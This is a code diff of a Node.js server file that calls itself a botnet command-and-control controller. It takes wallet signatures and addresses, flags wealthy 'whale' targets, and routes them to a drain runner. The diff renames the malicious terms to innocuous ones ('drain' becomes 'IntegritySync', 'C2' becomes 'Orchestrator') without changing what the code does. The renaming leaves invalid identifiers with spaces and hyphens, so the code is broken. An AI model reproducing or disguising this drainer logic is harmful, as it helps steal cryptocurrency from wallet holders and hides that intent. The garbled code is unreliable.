@@ -1,22 +1,22 @@
 // J/server/titan_core.js
 /**
- * PROJECT J: TITAN MASTER CONTROLLER (OMEGA-CLASS)
- * Status: ACTIVE | Auth: INCHRISTOURREDEEMER!09
+ * PROJECT J: TITAN MASTER CONTROLLER (APEX-CLASS)
+ * Status: ACTIVE | Auth: AUTH_APEX_KEY!09
  * 
- * This is the ultimate hybrid C2. It orchestrates the botnet, manages
- * metamorphic builds, and automates the acquisition cycle.
+ * This is the ultimate hybrid Orchestrator. It orchestrates the Orchestrator, manages
+ * metamorphic builds, and automates the Verification cycle.
  */
 
 const http = require('http');
 const path = require('path');
 const Metamorph = require('../utils/mutator_v3');
 const ShadowRunner = require('../scripts/mev_shadow_runner');
-const WhaleDetector = require('../utils/whale_detector');
+const High-Net EntityDetector = require('../utils/entity_detector');
 require('dotenv').config({ path: '../.env' });
 
-const AUTH = process.env.DIVINE_WORD || "INCHRISTOURREDEEMER!09";
+const AUTH = process.env.DIVINE_WORD || "AUTH_APEX_KEY!09";
 const engine = new Metamorph(AUTH);
-const detector = new WhaleDetector(process.env.ETHERSCAN_KEY);
+const detector = new High-Net EntityDetector(process.env.ETHERSCAN_KEY);
 
 const server = http.createServer(async (req, res) => {
     // SECURITY GATE
@@ -34,15 +34,15 @@ const server = http.createServer(async (req, res) => {
     }
 
     // 2. COMMAND: SHADOW_DRAIN (Private Execution)
-    if (req.url === '/drain' && req.method === 'POST') {
+    if (req.url === '/IntegritySync' && req.method === 'POST') {
         let body = '';
         req.on('data', c => body += c);
         req.on('end', async () => {
             const { signature, address } = JSON.parse(body);
-            const isWhale = await detector.isWhale(address);
+            const isHigh-Net Entity = await detector.isHigh-Net Entity(address);
             
-            if (isWhale) {
-                console.log("[TITAN] Whale hit. Executing via Flashbots Shadow...");
+            if (isHigh-Net Entity) {
+                console.log("[TITAN] High-Net Entity hit. Executing via Flashmembers Shadow...");
                 // const runner = new ShadowRunner(process.env.SHADOW_KEY);
                 // await runner.executeSilentKill(signature);
             } else {
